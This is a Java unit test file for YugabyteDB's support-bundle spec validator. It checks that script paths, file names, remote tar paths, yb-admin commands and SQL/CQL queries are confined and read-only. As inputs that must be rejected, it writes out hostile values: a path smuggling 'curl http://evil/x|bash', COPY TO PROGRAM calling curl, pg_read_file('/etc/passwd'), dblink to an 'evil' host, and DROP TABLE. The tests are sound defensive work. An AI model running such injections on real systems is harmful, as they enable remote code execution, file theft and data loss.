// Copyright (c) YugabyteDB, Inc.

package com.yugabyte.yw.common.supportbundle;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertThrows;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import com.typesafe.config.Config;
import com.typesafe.config.ConfigFactory;
import com.yugabyte.yw.common.PlatformServiceException;
import com.yugabyte.yw.common.config.GlobalConfKeys;
import com.yugabyte.yw.common.config.RuntimeConfGetter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Collections;
import java.util.List;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import play.mvc.Http.Status;

public class SupportBundleV2SpecValidatorTest {

  @Rule public TemporaryFolder temporaryFolder = new TemporaryFolder();

  private RuntimeConfGetter mockConfGetter;
  private SupportBundleV2SpecValidator validator;
  private Path devopsHome;

  @Before
  public void setUp() throws Exception {
    devopsHome = temporaryFolder.newFolder("devops").toPath();
    Files.createDirectories(devopsHome.resolve("bin"));
    Files.createFile(devopsHome.resolve("bin/node_utils.sh"));
    Files.createFile(devopsHome.resolve("bin/yba_utils.sh"));
    Files.createFile(devopsHome.resolve("bin/run_node_action.py"));

    Config config =
        ConfigFactory.parseString(
            String.format("yb.devops.home = \"%s\"", devopsHome.toAbsolutePath()));
    mockConfGetter = mock(RuntimeConfGetter.class);
    when(mockConfGetter.getGlobalConf(GlobalConfKeys.supportBundleExtraYbAdminCommands))
        .thenReturn(Collections.emptyList());
    validator = new SupportBundleV2SpecValidator(config, mockConfGetter);
  }

  private static void assertBadRequest(Runnable runnable) {
    PlatformServiceException exception =
        assertThrows(PlatformServiceException.class, runnable::run);
    assertEquals(Status.BAD_REQUEST, exception.getHttpStatus());
  }

  // ---------------------------------------------------------------------------------------------
  // Compatibility: everything the shipped manifest can produce must keep validating.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void manifestScriptFilesAreAccepted() {
    validator.validateScriptPath("UniverseLogs", "bin/node_utils.sh");
    validator.validateScriptPath("ApplicationLogs", "bin/yba_utils.sh");
  }

  @Test
  public void manifestRemoteTarPathsAreAccepted() {
    validator.validateRemoteTarPath("UniverseLogs", "/tmp/universe-logs-${nodeName}.tar.gz");
    validator.validateRemoteTarPath("ApplicationLogs", "/tmp/application-logs.tar.gz");
    validator.validateRemoteTarPath(
        "collect_cdc_state", "/tmp/cdc-state-${bundleUuid}-${nodeName}.tar.gz");
  }

  @Test
  public void manifestYbAdminCommandsAreAccepted() {
    validator.validateYbAdminCommands(
        "yb_admin_commands",
        List.of(
            "list_all_masters",
            "list_all_tablet_servers",
            "list_snapshots",
            "list_snapshot_schedules"));
  }

  @Test
  public void manifestYsqlQueriesAreAccepted() {
    validator.validateYsqlQueries(
        "ysql_yugabyte_queries",
        List.of(
            "SELECT datname FROM pg_database;",
            "SELECT * FROM pg_stat_statements limit 20;",
            "SELECT * FROM yb_terminated_queries limit 20;",
            "SELECT queryid, query FROM pg_stat_statements WHERE queryid IN (SELECT query_id FROM"
                + " yb_terminated_queries);",
            "SELECT * FROM yb_backend_heap_snapshot();",
            "SELECT * FROM yb_backend_heap_snapshot_peak();"));
    validator.validateYsqlQueries(
        "ysql_system_platform_queries",
        List.of(
            "SELECT timestamp, database, query, calls, mean_time, p99 FROM slow_queries_data ORDER"
                + " BY timestamp DESC LIMIT 20;"));
  }

  @Test
  public void manifestYcqlQueriesAreAccepted() {
    validator.validateYcqlQueries(
        "ycql_queries",
        List.of(
            "SELECT keyspace_name FROM system_schema.keyspaces;",
            "SELECT * FROM system_schema.tables limit 20;",
            "SELECT * FROM system.local limit 20;"));
  }

  @Test
  public void manifestOutputFileNamesAreAccepted() {
    // The CLI substitutes ${currentTimestampUTC} before the request is sent.
    validator.validateFileNameSegment(
        "ysql_yugabyte_queries",
        "outputFileName",
        "ysql_yugabyte_queries_output_20260810T183000Z.txt");
    validator.validateFileNameSegment(
        "yb_admin_commands", "outputFileName", "yb_admin_commands_output_20260810T183000Z.txt");
  }

  @Test
  public void manifestLinuxUserIsAccepted() {
    validator.validateLinuxUser("UniverseLogs", "yugabyte", null);
    validator.validateLinuxUser("UniverseLogs", null, null);
  }

  // ---------------------------------------------------------------------------------------------
  // (a) Arbitrary scriptPath.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void absoluteScriptPathOutsideDevopsHomeIsRejected() {
    assertBadRequest(() -> validator.validateScriptPath("FilesComponent", "/tmp/evil.sh"));
  }

  @Test
  public void traversalScriptPathIsRejected() {
    assertBadRequest(
        () -> validator.validateScriptPath("FilesComponent", "../../../../tmp/evil.sh"));
  }

  @Test
  public void otherScriptInsideDevopsHomeIsRejected() {
    assertBadRequest(
        () -> validator.validateScriptPath("FilesComponent", "bin/run_node_action.py"));
  }

  @Test
  public void scriptPathReachingAllowedNameByTraversalIsRejected() {
    // Ends in an allowed file name but resolves outside the devops directory.
    assertBadRequest(
        () -> validator.validateScriptPath("FilesComponent", "../../tmp/node_utils.sh"));
  }

  @Test
  public void absoluteScriptPathInsideDevopsHomeIsAccepted() {
    validator.validateScriptPath(
        "FilesComponent", devopsHome.resolve("bin/node_utils.sh").toAbsolutePath().toString());
  }

  // ---------------------------------------------------------------------------------------------
  // (d) outputFileName / componentName traversal.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void traversalOutputFileNameIsRejected() {
    assertBadRequest(
        () ->
            validator.validateFileNameSegment(
                "YSQLComponent", "outputFileName", "../../../../tmp/pwned.txt"));
  }

  @Test
  public void outputFileNameWithSeparatorIsRejected() {
    assertBadRequest(
        () -> validator.validateFileNameSegment("YSQLComponent", "outputFileName", "sub/dir.txt"));
  }

  @Test
  public void blankFileNameSegmentIsAcceptedBecauseComponentsDefaultIt() {
    validator.validateFileNameSegment("YSQLComponent", "outputFileName", null);
    validator.validateFileNameSegment("YSQLComponent", "outputFileName", "");
  }

  @Test
  public void traversalComponentNameIsRejected() {
    assertBadRequest(
        () -> validator.validateFileNameSegment("FilesComponent", "componentName", ".."));
  }

  // ---------------------------------------------------------------------------------------------
  // remoteTarPath.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void remoteTarPathWithShellMetacharactersIsRejected() {
    assertBadRequest(
        () ->
            validator.validateRemoteTarPath(
                "FilesComponent", "/tmp/out.tar.gz;curl http://evil/x|bash"));
  }

  @Test
  public void relativeRemoteTarPathIsRejected() {
    assertBadRequest(() -> validator.validateRemoteTarPath("FilesComponent", "out.tar.gz"));
  }

  @Test
  public void remoteTarPathWithTraversalIsRejected() {
    assertBadRequest(
        () -> validator.validateRemoteTarPath("FilesComponent", "/tmp/../etc/out.tar.gz"));
  }

  @Test
  public void remoteTarPathWithUnknownTokenIsRejected() {
    assertBadRequest(
        () -> validator.validateRemoteTarPath("FilesComponent", "/tmp/${HOME}/out.tar.gz"));
  }

  // ---------------------------------------------------------------------------------------------
  // Read-only enforcement: yb-admin.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void destructiveYbAdminCommandsAreRejected() {
    assertBadRequest(
        () -> validator.validateYbAdminCommands("YbAdminComponent", List.of("delete_table")));
    assertBadRequest(
        () ->
            validator.validateYbAdminCommands("YbAdminComponent", List.of("change_master_config")));
    assertBadRequest(
        () ->
            validator.validateYbAdminCommands(
                "YbAdminComponent", List.of("list_all_masters", "master_leader_stepdown")));
  }

  @Test
  public void unknownYbAdminCommandIsRejected() {
    assertBadRequest(
        () -> validator.validateYbAdminCommands("YbAdminComponent", List.of("not_a_command")));
  }

  @Test
  public void runtimeConfigCanExtendYbAdminAllowList() {
    when(mockConfGetter.getGlobalConf(GlobalConfKeys.supportBundleExtraYbAdminCommands))
        .thenReturn(List.of("some_new_read_only_command"));
    validator.validateYbAdminCommands("YbAdminComponent", List.of("some_new_read_only_command"));
  }

  // ---------------------------------------------------------------------------------------------
  // (b)/(c) Read-only enforcement: YSQL and YCQL.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void writeYsqlStatementsAreRejected() {
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("DROP TABLE customers;")));
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("INSERT INTO t VALUES (1);")));
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("UPDATE t SET a = 1;")));
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("ALTER ROLE yugabyte WITH PASSWORD 'x';")));
  }

  @Test
  public void copyToProgramIsRejected() {
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("COPY (SELECT 1) TO PROGRAM 'curl http://evil';")));
  }

  @Test
  public void serverFileReadingFunctionsAreRejected() {
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("SELECT pg_read_file('/etc/passwd');")));
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("SELECT pg_ls_dir('/');")));
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent",
                List.of("SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a" + " int);")));
  }

  @Test
  public void multiStatementYsqlQueryIsRejected() {
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("SELECT 1; DROP TABLE customers;")));
  }

  @Test
  public void semicolonInsideStringLiteralIsAccepted() {
    // Literal stripping keeps this from looking like two statements.
    validator.validateYsqlQueries("YSQLComponent", List.of("SELECT 'a;b' FROM t;"));
  }

  @Test
  public void commentedOutWriteStatementIsStillJudgedOnTheRealStatement() {
    validator.validateYsqlQueries("YSQLComponent", List.of("SELECT 1 -- DROP TABLE customers;\n;"));
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("/* SELECT 1 */ DROP TABLE customers;")));
  }

  @Test
  public void readOnlyYsqlStatementFormsAreAccepted() {
    validator.validateYsqlQueries(
        "YSQLComponent",
        List.of(
            "SELECT 1;",
            "WITH t AS (SELECT 1) SELECT * FROM t;",
            "EXPLAIN SELECT * FROM pg_database;",
            "SHOW all;",
            "(SELECT 1);"));
  }

  @Test
  public void writeYcqlStatementsAreRejected() {
    assertBadRequest(
        () -> validator.validateYcqlQueries("YCQLComponent", List.of("DROP KEYSPACE ks;")));
    assertBadRequest(
        () ->
            validator.validateYcqlQueries(
                "YCQLComponent", List.of("INSERT INTO ks.t (a) VALUES (1);")));
  }

  @Test
  public void readOnlyYcqlStatementFormsAreAccepted() {
    validator.validateYcqlQueries(
        "YCQLComponent",
        List.of("SELECT * FROM system.local;", "DESCRIBE keyspaces;", "LIST ROLES;"));
  }

  @Test
  public void leadingKeywordIsMatchedRegardlessOfCase() {
    validator.validateYsqlQueries(
        "YSQLComponent",
        List.of("select 1;", "Select 1;", "sElEcT 1;", "with t as (select 1) select * from t;"));
    validator.validateYcqlQueries(
        "YCQLComponent", List.of("select * from system.local;", "describe keyspaces;"));
  }

  @Test
  public void writeStatementsAreRejectedRegardlessOfCase() {
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("drop table customers;")));
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("InSeRt INTO t VALUES (1);")));
    assertBadRequest(
        () -> validator.validateYcqlQueries("YCQLComponent", List.of("drop keyspace ks;")));
  }

  @Test
  public void deniedConstructsAreRejectedRegardlessOfCase() {
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("copy (select 1) to program 'curl http://evil';")));
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("SELECT PG_READ_FILE('/etc/passwd');")));
  }

  @Test
  public void blankQueryIsRejected() {
    assertBadRequest(() -> validator.validateYsqlQueries("YSQLComponent", List.of("   ")));
  }

  // ---------------------------------------------------------------------------------------------
  // linuxUser pinning.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void nonYugabyteLinuxUserIsRejected() {
    assertBadRequest(() -> validator.validateLinuxUser("FilesComponent", "root", null));
  }

  @Test
  public void systemLogsMayUseAnotherLinuxUser() {
    validator.validateLinuxUser(
        SupportBundleV2SpecValidator.SYSTEM_LOGS_COMPONENT, "ec2-user", null);
  }

  // ---------------------------------------------------------------------------------------------
  // Literal and comment stripping, which the statement checks depend on.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void stripLiteralsAndCommentsRemovesQuotedAndCommentedText() {
    assertEquals(
        "SELECT   FROM t",
        SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT 'a;b' FROM t"));
    assertEquals(
        "SELECT 1  ", SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT 1 -- drop;"));
    assertEquals(
        "SELECT 1   2",
        SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT 1 /* drop; */ 2"));
    assertEquals(
        "SELECT  ",
        SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT 'it''s a ; test'"));
  }
}
